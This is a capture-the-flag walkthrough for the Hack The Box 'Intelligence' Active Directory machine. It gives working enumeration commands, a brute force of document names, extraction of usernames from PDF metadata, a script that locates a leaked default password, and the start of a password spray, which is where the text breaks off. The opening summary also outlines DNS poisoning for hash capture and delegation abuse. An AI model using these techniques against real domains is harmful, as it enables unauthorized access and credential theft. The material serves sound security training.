# [intelligence](https://app.hackthebox.eu/machines/Intelligence)

> A Windows Active Directory Domain Controller for Intelligence Corp. Its web server hosted about a hundred PDFs, each of whose author could be extracted from its metadata and one of which contained a default Intelligence Corp password. One of these authors and the default password were valid and granted access to an SMB share. The SMB share revealed a PowerShell script that was running every five minutes. The script would query the domain controller via LDAP for all hosts in Active Directory Integrated Domain Name Service (ADIDNS) who began with the prefix "web\*" and would send an HTTP request to that hostname with the user's NetNTLMv2 password hash. Using the domain credential to create a `web\*.intelligence.htb` DNS record mapping to the attacker's machine and then responding to HTTP requests yielded a user in the IT Support group's password hash, which was cracked using a common word list. With the IT Support user's password, it was possible to read a Group Managed Service Account's (GMSA) NTLM hash. This GMSA had constrained delegation privilege on a service on the domain controller. Thus, the GMSA's password hash could be used to impersonate the domain administrator and generate a ticket, which granted administrative access to the target machine.

---

## Open Port Enumeration

### TCP

```bash
$ masscan -p1-65535 10.10.10.248 --rate=1000 -e tun0 --output-format grepable --output-filename intelligence.masscan
$ cat intelligence.masscan  | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','
135,139,3268,3269,389,445,464,49667,49691,49692,49706,49713,53,53835,593,5985,636,80,88,9389,
```

```bash
$ nmap -sC -sV -O -p135,139,3268,3269,389,445,464,49667,49691,49692,49706,49713,53,53835,593,5985,636,80,88,9389 10.10.10.248 -oA intelligence
Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-25 18:37 EDT
Nmap scan report for 10.10.10.248
Host is up (0.046s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain?
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Intelligence
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-09-26 05:37:31Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2021-09-26T05:40:33+00:00; +6h59m46s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2021-09-26T05:40:33+00:00; +6h59m46s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-09-26T05:40:33+00:00; +6h59m46s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2021-09-26T05:40:33+00:00; +6h59m46s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49706/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
53835/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2021-09-26T05:39:56
|_  start_date: N/A
|_clock-skew: mean: 6h59m45s, deviation: 0s, median: 6h59m45s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 189.82 seconds
```

DNS, Kerberos, LDAP, and the machine's hostname `dc.intelligence.htb` seem to indicate this machine is an Active Directory domain controller. Add the domain name to the local DNS resolver.

### UDP

```bash
$ nmap -sU 10.10.10.248
Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-25 18:37 EDT
Nmap scan report for 10.10.10.248
Host is up (0.048s latency).
Not shown: 997 open|filtered udp ports (no-response)
PORT    STATE SERVICE
53/udp  open  domain
123/udp open  ntp
389/udp open  ldap

Nmap done: 1 IP address (1 host up) scanned in 9.88 seconds
```

---

## DNS Enumeration

```bash
$ fierce --domain intelligence.htb --dns-servers 10.10.10.248
NS: dc.intelligence.htb.
SOA: dc.intelligence.htb. (10.10.10.248)
Zone: failure
Wildcard: failure
Found: dc.intelligence.htb. (10.10.10.248)
```

Zone transfers aren't allowed. Nothing here.

---

## SMB Enumeration

```bash
$ smbmap -H 10.10.10.248
[+] IP: 10.10.10.248:445        Name: intelligence.htb
```

Nothing.

```bash
$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.10.248
Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-25 19:27 EDT
Nmap scan report for intelligence.htb (10.10.10.248)
Host is up (0.048s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 5.79 seconds
```

Nothing.

```bash
$ enum4linux -a 10.10.10.248
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Sep 25 19:28:55 2021

 ==========================
|    Target Information    |
 ==========================
Target ........... 10.10.10.248
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ====================================================
|    Enumerating Workgroup/Domain on 10.10.10.248    |
 ====================================================
[E] Can't find workgroup/domain


 ============================================
|    Nbtstat Information for 10.10.10.248    |
 ============================================
Looking up status of 10.10.10.248
No reply from 10.10.10.248

 =====================================
|    Session Check on 10.10.10.248    |
 =====================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
[+] Server 10.10.10.248 allows sessions using username '', password ''
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
[+] Got domain/workgroup name:

 ===========================================
|    Getting domain SID for 10.10.10.248    |
 ===========================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
Domain Name: intelligence
Domain Sid: S-1-5-21-4210132550-3389855604-3437519686
[+] Host is part of a domain (not a workgroup)

 ======================================
|    OS information on 10.10.10.248    |
 ======================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 10.10.10.248 from smbclient:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.
[+] Got OS info for 10.10.10.248 from srvinfo:
Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED

 =============================
|    Users on 10.10.10.248    |
 =============================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED

 =========================================
|    Share Enumeration on 10.10.10.248    |
 =========================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.

        Sharename       Type      Comment
        ---------       ----      -------
SMB1 disabled -- no workgroup available

[+] Attempting to map shares on 10.10.10.248

 ====================================================
|    Password Policy Information for 10.10.10.248    |
 ====================================================
[E] Unexpected error from polenum:


[+] Attaching to 10.10.10.248 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.10.10.248)

[+] Trying protocol 445/SMB...

        [!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.

[E] Failed to get password policy with rpcclient


 ==============================
|    Groups on 10.10.10.248    |
 ==============================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.

[+] Getting builtin groups:

[+] Getting builtin group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.

[+] Getting local groups:

[+] Getting local group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.

[+] Getting domain groups:

[+] Getting domain group memberships:

 =======================================================================
|    Users on 10.10.10.248 via RID cycling (RIDS: 500-550,1000-1050)    |
 =======================================================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 742.

 =============================================
|    Getting printer info for 10.10.10.248    |
 =============================================
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 991.
Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED


enum4linux complete on Sat Sep 25 19:29:23 2021
```

Nothing.

---

## Web Application Enumeration

### Content Discovery

```bash
$ gobuster dir -u http://intelligence.htb -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://intelligence.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/09/25 19:43:35 Starting gobuster in directory enumeration mode
===============================================================
/documents            (Status: 301) [Size: 157] [--> http://intelligence.htb/documents/]
/.                    (Status: 200) [Size: 7432]
/Documents            (Status: 301) [Size: 157] [--> http://intelligence.htb/Documents/]
/DOCUMENTS            (Status: 301) [Size: 157] [--> http://intelligence.htb/DOCUMENTS/]

===============================================================
2021/09/25 19:47:09 Finished
===============================================================
```

`/documents/` and its variants all return 403 Forbidden.

### Virtual Host Discovery

```bash
$ gobuster vhost -u http://intelligence.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://intelligence.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2021/09/25 19:43:54 Starting gobuster in VHOST enumeration mode
===============================================================

===============================================================
2021/09/25 19:44:20 Finished
===============================================================
```

Nothing.

### Manual Enumeration

The home page is fairly unexciting. It contains a form with an email address input for subscribing to a newsletter, but the form itself doesn't submit anywhere or trigger any JavaScript events.

The page does contain links to two PDF documents: "Announcement Document" (`/documents/2020-01-01-upload.pdf`) and "Other Document" (`/documents/2020-12-05-upload.pdf`). Both documents just contain generic lorem ipsum text.

![](images/Pasted%20image%2020210925195407.png)

The page also contains a contact email address: `contact@intelligence.htb`. Add the `intelligence.htb` domain name to the local DNS resolver.

### Brute Forcing Documents

The two documents are named with the pattern `YYY-MM-DD-upload.pdf`. Brute force for more documents matching this pattern within the past two years.

```bash
$ for i in {2019..2021}; do echo $i >> years.txt; done
$ for i in {01..12}; do echo $i >> months.txt; done
$ for i in {01..31}; do echo $i >> days.txt; done
$ patator http_fuzz url='http://intelligence.htb/documents/FILE0-FILE1-FILE2-upload.pdf' 0=years.txt 1=months.txt 2=days.txt -t 1 | tee documents.txt
20:19:47 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.9.2 at 2021-09-25 20:19 EDT
20:19:48 patator    INFO -
20:19:48 patator    INFO - code size:clen       time | candidate                          |   num | mesg
20:19:48 patator    INFO - -----------------------------------------------------------------------------
20:20:06 patator    INFO - 200  27067:26835    0.051 | 2020:01:01                         |   373 | HTTP/1.1 200 OK
20:20:06 patator    INFO - 200  27234:27002    0.056 | 2020:01:02                         |   374 | HTTP/1.1 200 OK
20:20:06 patator    INFO - 200  27754:27522    0.053 | 2020:01:04                         |   376 | HTTP/1.1 200 OK
20:20:07 patator    INFO - 200  26632:26400    0.057 | 2020:01:10                         |   382 | HTTP/1.1 200 OK
20:20:07 patator    INFO - 200  11864:11632    0.043 | 2020:01:20                         |   392 | HTTP/1.1 200 OK
20:20:07 patator    INFO - 200  28869:28637    0.056 | 2020:01:22                         |   394 | HTTP/1.1 200 OK
20:20:07 patator    INFO - 200  11789:11557    0.052 | 2020:01:23                         |   395 | HTTP/1.1 200 OK
20:20:07 patator    INFO - 200  26484:26252    0.058 | 2020:01:25                         |   397 | HTTP/1.1 200 OK
20:20:08 patator    INFO - 200  26938:26706    0.048 | 2020:01:30                         |   402 | HTTP/1.1 200 OK
20:20:08 patator    INFO - 200  25477:25245    0.049 | 2020:02:11                         |   414 | HTTP/1.1 200 OK
20:20:08 patator    INFO - 200  11460:11228    0.043 | 2020:02:17                         |   420 | HTTP/1.1 200 OK
20:20:09 patator    INFO - 200  27610:27378    0.058 | 2020:02:23                         |   426 | HTTP/1.1 200 OK
20:20:09 patator    INFO - 200  27564:27332    0.053 | 2020:02:24                         |   427 | HTTP/1.1 200 OK
20:20:09 patator    INFO - 200  11775:11543    0.048 | 2020:02:28                         |   431 | HTTP/1.1 200 OK
20:20:09 patator    INFO - 200  26426:26194    0.054 | 2020:03:04                         |   438 | HTTP/1.1 200 OK
20:20:09 patator    INFO - 200  26356:26124    0.092 | 2020:03:05                         |   439 | HTTP/1.1 200 OK
20:20:10 patator    INFO - 200  27375:27143    0.055 | 2020:03:12                         |   446 | HTTP/1.1 200 OK
20:20:10 patator    INFO - 200  25120:24888    0.052 | 2020:03:13                         |   447 | HTTP/1.1 200 OK
20:20:10 patator    INFO - 200  27459:27227    0.057 | 2020:03:17                         |   451 | HTTP/1.1 200 OK
20:20:10 patator    INFO - 200  11482:11250    0.042 | 2020:03:21                         |   455 | HTTP/1.1 200 OK
20:20:11 patator    INFO - 200  11698:11466    0.056 | 2020:04:02                         |   467 | HTTP/1.1 200 OK
20:20:11 patator    INFO - 200  28181:27949    0.053 | 2020:04:04                         |   469 | HTTP/1.1 200 OK
20:20:11 patator    INFO - 200  26921:26689    0.062 | 2020:04:15                         |   480 | HTTP/1.1 200 OK
20:20:12 patator    INFO - 200  25097:24865    0.049 | 2020:04:23                         |   488 | HTTP/1.1 200 OK
20:20:12 patator    INFO - 200  28460:28228    0.063 | 2020:05:01                         |   497 | HTTP/1.1 200 OK
20:20:12 patator    INFO - 200  26325:26093    0.048 | 2020:05:03                         |   499 | HTTP/1.1 200 OK
20:20:12 patator    INFO - 200  26294:26062    0.054 | 2020:05:07                         |   503 | HTTP/1.1 200 OK
20:20:13 patator    INFO - 200  27476:27244    0.055 | 2020:05:11                         |   507 | HTTP/1.1 200 OK
20:20:13 patator    INFO - 200  26680:26448    0.050 | 2020:05:17                         |   513 | HTTP/1.1 200 OK
20:20:13 patator    INFO - 200  27712:27480    0.057 | 2020:05:20                         |   516 | HTTP/1.1 200 OK
20:20:13 patator    INFO - 200  26487:26255    0.051 | 2020:05:21                         |   517 | HTTP/1.1 200 OK
20:20:13 patator    INFO - 200  12089:11857    0.046 | 2020:05:24                         |   520 | HTTP/1.1 200 OK
20:20:14 patator    INFO - 200  11764:11532    0.044 | 2020:05:29                         |   525 | HTTP/1.1 200 OK
20:20:14 patator    INFO - 200  28029:27797    0.047 | 2020:06:02                         |   529 | HTTP/1.1 200 OK
20:20:14 patator    INFO - 200  11613:11381    0.048 | 2020:06:03                         |   530 | HTTP/1.1 200 OK
20:20:14 patator    INFO - 200  27154:26922    0.071 | 2020:06:04                         |   531 | HTTP/1.1 200 OK
20:20:14 patator    INFO - 200  28169:27937    0.049 | 2020:06:07                         |   534 | HTTP/1.1 200 OK
20:20:14 patator    INFO - 200  11772:11540    0.053 | 2020:06:08                         |   535 | HTTP/1.1 200 OK
20:20:14 patator    INFO - 200  11807:11575    0.049 | 2020:06:12                         |   539 | HTTP/1.1 200 OK
20:20:14 patator    INFO - 200  26675:26443    0.048 | 2020:06:14                         |   541 | HTTP/1.1 200 OK
20:20:14 patator    INFO - 200  27353:27121    0.062 | 2020:06:15                         |   542 | HTTP/1.1 200 OK
20:20:15 patator    INFO - 200  26292:26060    0.058 | 2020:06:21                         |   548 | HTTP/1.1 200 OK
20:20:15 patator    INFO - 200  26510:26278    0.081 | 2020:06:22                         |   549 | HTTP/1.1 200 OK
20:20:15 patator    INFO - 200  10894:10662    0.048 | 2020:06:25                         |   552 | HTTP/1.1 200 OK
20:20:15 patator    INFO - 200  27570:27338    0.056 | 2020:06:26                         |   553 | HTTP/1.1 200 OK
20:20:15 patator    INFO - 200  26622:26390    0.054 | 2020:06:28                         |   555 | HTTP/1.1 200 OK
20:20:15 patator    INFO - 200  25866:25634    0.055 | 2020:06:30                         |   557 | HTTP/1.1 200 OK
20:20:15 patator    INFO - 200  27552:27320    0.049 | 2020:07:02                         |   560 | HTTP/1.1 200 OK
20:20:16 patator    INFO - 200  25198:24966    0.054 | 2020:07:06                         |   564 | HTTP/1.1 200 OK
20:20:16 patator    INFO - 200  12142:11910    0.046 | 2020:07:08                         |   566 | HTTP/1.1 200 OK
20:20:16 patator    INFO - 200  12332:12100    0.049 | 2020:07:20                         |   578 | HTTP/1.1 200 OK
20:20:16 patator    INFO - 200  26553:26321    0.049 | 2020:07:24                         |   582 | HTTP/1.1 200 OK
20:20:17 patator    INFO - 200  27270:27038    0.052 | 2020:08:01                         |   590 | HTTP/1.1 200 OK
20:20:17 patator    INFO - 200  25637:25405    0.056 | 2020:08:03                         |   592 | HTTP/1.1 200 OK
20:20:17 patator    INFO - 200  11843:11611    0.043 | 2020:08:09                         |   598 | HTTP/1.1 200 OK
20:20:18 patator    INFO - 200  27117:26885    0.048 | 2020:08:19                         |   608 | HTTP/1.1 200 OK
20:20:18 patator    INFO - 200  10943:10711    0.048 | 2020:08:20                         |   609 | HTTP/1.1 200 OK
20:20:18 patator    INFO - 200  27380:27148    0.049 | 2020:09:02                         |   622 | HTTP/1.1 200 OK
20:20:18 patator    INFO - 200  27218:26986    0.048 | 2020:09:04                         |   624 | HTTP/1.1 200 OK
20:20:19 patator    INFO - 200  26649:26417    0.063 | 2020:09:05                         |   625 | HTTP/1.1 200 OK
20:20:19 patator    INFO - 200  25783:25551    0.058 | 2020:09:06                         |   626 | HTTP/1.1 200 OK
20:20:19 patator    INFO - 200  12330:12098    0.046 | 2020:09:11                         |   631 | HTTP/1.1 200 OK
20:20:19 patator    INFO - 200  26753:26521    0.054 | 2020:09:13                         |   633 | HTTP/1.1 200 OK
20:20:19 patator    INFO - 200  27191:26959    0.056 | 2020:09:16                         |   636 | HTTP/1.1 200 OK
20:20:19 patator    INFO - 200  25304:25072    0.055 | 2020:09:22                         |   642 | HTTP/1.1 200 OK
20:20:20 patator    INFO - 200  27041:26809    0.056 | 2020:09:27                         |   647 | HTTP/1.1 200 OK
20:20:20 patator    INFO - 200  24818:24586    0.047 | 2020:09:29                         |   649 | HTTP/1.1 200 OK
20:20:20 patator    INFO - 200  26312:26080    0.054 | 2020:09:30                         |   650 | HTTP/1.1 200 OK
20:20:20 patator    INFO - 200  11480:11248    0.048 | 2020:10:05                         |   656 | HTTP/1.1 200 OK
20:20:21 patator    INFO - 200  27428:27196    0.056 | 2020:10:19                         |   670 | HTTP/1.1 200 OK
20:20:21 patator    INFO - 200  26831:26599    0.066 | 2020:11:01                         |   683 | HTTP/1.1 200 OK
20:20:21 patator    INFO - 200  25800:25568    0.061 | 2020:11:03                         |   685 | HTTP/1.1 200 OK
20:20:22 patator    INFO - 200  26196:25964    0.059 | 2020:11:06                         |   688 | HTTP/1.1 200 OK
20:20:22 patator    INFO - 200  25704:25472    0.055 | 2020:11:10                         |   692 | HTTP/1.1 200 OK
20:20:22 patator    INFO - 200  26693:26461    0.060 | 2020:11:11                         |   693 | HTTP/1.1 200 OK
20:20:22 patator    INFO - 200  11306:11074    0.071 | 2020:11:13                         |   695 | HTTP/1.1 200 OK
20:20:23 patator    INFO - 200  11644:11412    0.043 | 2020:11:24                         |   706 | HTTP/1.1 200 OK
20:20:23 patator    INFO - 200  27518:27286    0.055 | 2020:11:30                         |   712 | HTTP/1.1 200 OK
20:20:23 patator    INFO - 200  26994:26762    0.049 | 2020:12:10                         |   723 | HTTP/1.1 200 OK
20:20:24 patator    INFO - 200  27474:27242    0.051 | 2020:12:15                         |   728 | HTTP/1.1 200 OK
20:20:24 patator    INFO - 200  12134:11902    0.051 | 2020:12:20                         |   733 | HTTP/1.1 200 OK
20:20:24 patator    INFO - 200  27057:26825    0.056 | 2020:12:24                         |   737 | HTTP/1.1 200 OK
20:20:24 patator    INFO - 200  11712:11480    0.046 | 2020:12:28                         |   741 | HTTP/1.1 200 OK
20:20:24 patator    INFO - 200  25341:25109    0.056 | 2020:12:30                         |   743 | HTTP/1.1 200 OK
20:20:24 patator    INFO - 200  28060:27828    0.051 | 2021:01:03                         |   747 | HTTP/1.1 200 OK
20:20:25 patator    INFO - 200  11410:11178    0.047 | 2021:01:14                         |   758 | HTTP/1.1 200 OK
20:20:26 patator    INFO - 200  27814:27582    0.056 | 2021:01:25                         |   769 | HTTP/1.1 200 OK
20:20:26 patator    INFO - 200  26171:25939    0.053 | 2021:01:30                         |   774 | HTTP/1.1 200 OK
20:20:26 patator    INFO - 200  27210:26978    0.050 | 2021:02:10                         |   785 | HTTP/1.1 200 OK
20:20:27 patator    INFO - 200  27285:27053    0.049 | 2021:02:13                         |   788 | HTTP/1.1 200 OK
20:20:27 patator    INFO - 200  26264:26032    0.057 | 2021:02:21                         |   796 | HTTP/1.1 200 OK
20:20:27 patator    INFO - 200  26932:26700    0.061 | 2021:02:25                         |   800 | HTTP/1.1 200 OK
20:20:27 patator    INFO - 200  11486:11254    0.043 | 2021:03:01                         |   807 | HTTP/1.1 200 OK
20:20:28 patator    INFO - 200  10908:10676    0.042 | 2021:03:07                         |   813 | HTTP/1.1 200 OK
20:20:28 patator    INFO - 200  25341:25109    0.050 | 2021:03:10                         |   816 | HTTP/1.1 200 OK
20:20:28 patator    INFO - 200  28224:27992    0.057 | 2021:03:18                         |   824 | HTTP/1.1 200 OK
20:20:28 patator    INFO - 200  27042:26810    0.067 | 2021:03:21                         |   827 | HTTP/1.1 200 OK
20:20:29 patator    INFO - 200  27559:27327    0.061 | 2021:03:25                         |   831 | HTTP/1.1 200 OK
20:20:29 patator    INFO - 200  12359:12127    0.041 | 2021:03:27                         |   833 | HTTP/1.1 200 OK
20:20:43 patator    INFO - Hits/Done/Skip/Fail/Size: 99/1116/0/0/1116, Avg: 20 r/s, Time: 0h 0m 55s
```

There are documents from as early as 2020-01-01 to as late as 2021-03-27. Both are lorem ipsum. 2020-06-25 is the smallest file and 2020-01-22 is the largest file. Both are also lorem ipsum.

---

## Extracting the PDFs' Creators

Use `exiftool` to extract the PDFs' metadata.

```bash
$ exiftool 2020-01-01-upload.pdf
ExifTool Version Number         : 12.16
File Name                       : 2020-01-01-upload.pdf
Directory                       : .
File Size                       : 26 KiB
File Modification Date/Time     : 2021:09:25 20:35:42-04:00
File Access Date/Time           : 2021:09:25 20:35:41-04:00
File Inode Change Date/Time     : 2021:09:25 20:35:55-04:00
File Permissions                : rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : William.Lee
```

```bash
$ exiftool 2020-12-15-upload.pdf
ExifTool Version Number         : 12.16
File Name                       : 2020-12-15-upload.pdf
Directory                       : .
File Size                       : 27 KiB
File Modification Date/Time     : 2021:09:25 20:35:48-04:00
File Access Date/Time           : 2021:09:25 20:35:48-04:00
File Inode Change Date/Time     : 2021:09:25 20:35:55-04:00
File Permissions                : rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : Jose.Williams
```

Possible users: `William Lee` and `Jose Williams`? Extract potential users from all of the PDF documents.

```bash
$ for d in $(cat documents.txt | grep '200 OK' | cut -d' ' -f 16 | tr ':' '-'); do (wget -q http://intelligence.htb/documents/$d-upload.pdf; exiftool $d-upload.pdf | grep Creator | cut -d':' -f2 | cut -d' ' -f2; rm $d-upload.pdf); done
William.Lee
Scott.Scott
Jason.Wright
Veronica.Patel
Jennifer.Thomas
Danny.Matthews
David.Reed
Stephanie.Young
Daniel.Shelton
Jose.Williams
John.Coleman
Jason.Wright
Jose.Williams
Daniel.Shelton
Brian.Morris
Jennifer.Thomas
Thomas.Valenzuela
Travis.Evans
Samuel.Richardson
Richard.Williams
David.Mcbride
Jose.Williams
John.Coleman
William.Lee
Anita.Roberts
Brian.Baker
Jose.Williams
David.Mcbride
Kelly.Long
John.Coleman
Jose.Williams
Nicole.Brock
Thomas.Valenzuela
David.Reed
Kaitlyn.Zimmerman
Jason.Patterson
Thomas.Valenzuela
David.Mcbride
Darryl.Harris
William.Lee
Stephanie.Young
David.Reed
Nicole.Brock
David.Mcbride
William.Lee
Stephanie.Young
John.Coleman
David.Wilson
Scott.Scott
Teresa.Williamson
John.Coleman
Veronica.Patel
John.Coleman
Samuel.Richardson
Ian.Duncan
Nicole.Brock
William.Lee
Jason.Wright
Travis.Evans
David.Mcbride
Jessica.Moody
Ian.Duncan
Jason.Wright
Richard.Williams
Tiffany.Molina
Jose.Williams
Jessica.Moody
Brian.Baker
Anita.Roberts
Teresa.Williamson
Kaitlyn.Zimmerman
Jose.Williams
Stephanie.Young
Samuel.Richardson
Tiffany.Molina
Ian.Duncan
Kelly.Long
Travis.Evans
Ian.Duncan
Jose.Williams
David.Wilson
Thomas.Hall
Ian.Duncan
Jason.Patterson
Stephanie.Young
Kaitlyn.Zimmerman
Travis.Evans
Kelly.Long
Danny.Matthews
Travis.Evans
Jessica.Moody
Thomas.Valenzuela
Anita.Roberts
Stephanie.Young
David.Reed
Jose.Williams
Veronica.Patel
Ian.Duncan
Richard.Williams
```

There are 30 unique potential users from the documents.

Iterate through all of the documents, count up the frequency of the words, and print out all words that appear in the documents 5 times or less.

```python
import os
import pdftotext


frequencies = {}
files_dir = f"{os.getcwd()}/files"
pdfs = os.listdir(files_dir)
for pdf in pdfs:
    with open(f"{files_dir}/{pdf}", "rb") as f:
        pdf = pdftotext.PDF(f)
        pdf = " ".join(pdf)
        pdf = pdf.replace(".", "").replace("\n", " ")
        for word in pdf.split():
            if word not in frequencies:
                freq[word] = 1
            else:
                freq[word] += 1

print({word: frequencies[word] for word in frequencies if frequencies[word] < 5})
```

```txt
{'Internal': 1, 'IT': 1, 'Update': 1, 'There': 1, 'has': 2, 'recently': 1, 'been': 1, 'some': 1, 'outages': 1, 'on': 1, 'our': 3, 'web': 1, 'servers': 1, 'Ted': 1, 'gotten': 1, 'a': 1, 'script': 1, 'in': 3, 'place': 1, 'to': 2, 'help': 1, 'notify': 1, 'us': 1, 'if': 1, 'this': 1, 'happens': 1, 'again': 1, 'Also,': 1, 'after': 1, 'discussion': 1, 'following': 1, 'recent': 1, 'security': 1, 'audit': 1, 'we': 1, 'are': 1, 'the': 2, 'process': 1, 'of': 1, 'locking': 1, 'down': 1, 'service': 1, 'accounts': 1, 'New': 1, 'Account': 1, 'Guide': 1, 'Welcome': 1, 'Intelligence': 1, 'Corp!': 1, 'Please': 1, 'login': 1, 'using': 1, 'your': 2, 'username': 1, 'and': 1, 'default': 1, 'password': 2, 'of:': 1, 'NewIntelligenceCorpUser9876': 1, 'After': 1, 'logging': 1, 'please': 1, 'change': 1, 'as': 2, 'soon': 1, 'possible': 1}
```

There appears to be a coherent document somewhere in the list. Determine the name of the document containing the interesting string "NewIntelligenceCorpUser9876."

```python
import os
import pdftotext


files_dir = f"{os.getcwd()}/files"
pdfs = os.listdir(files_dir)
for pdf in pdfs:
    path = f"{files_dir}/{pdf}"
    with open(path, "rb") as f:
        pdf = pdftotext.PDF(f)
        pdf = " ".join(pdf)
        pdf = pdf.replace(".", "").replace("\n", " ")
        for word in pdf.split():
            if word == "NewIntelligenceCorpUser9876":
                print(path)
```

```text
2020-06-04-upload.pdf
```

Read this document.

![](images/Pasted%20image%2020210926212015.png)

The document indicates that new Intelligence Corp users can login with the default password `NewIntelligenceCorpUser9876`.

Spray this password with all of the usernames found from the documents.

```bash
$ crackmapexec smb dc.intelligence.htb -d intelligence.htb -u users.txt -p NewIntelligenceCorpUser9876
[*] First time use detected
